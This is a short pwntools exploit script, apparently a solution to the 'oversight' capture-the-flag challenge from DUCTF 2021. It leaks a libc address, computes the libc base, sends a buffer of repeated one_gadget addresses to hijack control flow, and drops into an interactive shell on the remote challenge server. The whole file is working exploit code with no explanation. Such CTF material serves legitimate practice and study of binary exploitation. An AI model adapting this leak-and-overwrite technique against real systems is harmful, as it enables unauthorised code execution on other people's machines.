# Author: ghsi10
# first of all patch elf and link it to libc

from pwn import *

if args.REMOTE:
    p = remote("pwn-2021.duc.tf", 31909)
elif args.GDB:
    p = gdb.debug("./oversight_patched")
else:
    p = process("./oversight_patched")
libc = ELF("./libc.so.6")

p.sendlineafter(b"Press enter to continue", b"")
p.sendlineafter(b"Pick a number:", b"6")
p.recvuntil(b"Your magic number is:")
leak = int(p.recvline()[:-1], 16)
info(f"leak address: {hex(leak)}")
libc.address = leak - (libc.symbols._IO_2_1_stdout_ + 131)
info(f"libc base address: {hex(libc.address)}")

one_gadget = libc.address + 0x4f3d5

payload = p64(one_gadget)*32

p.sendlineafter(b"How many bytes do you want to read (max 256)?", b"256")
p.sendline(payload)

p.interactive()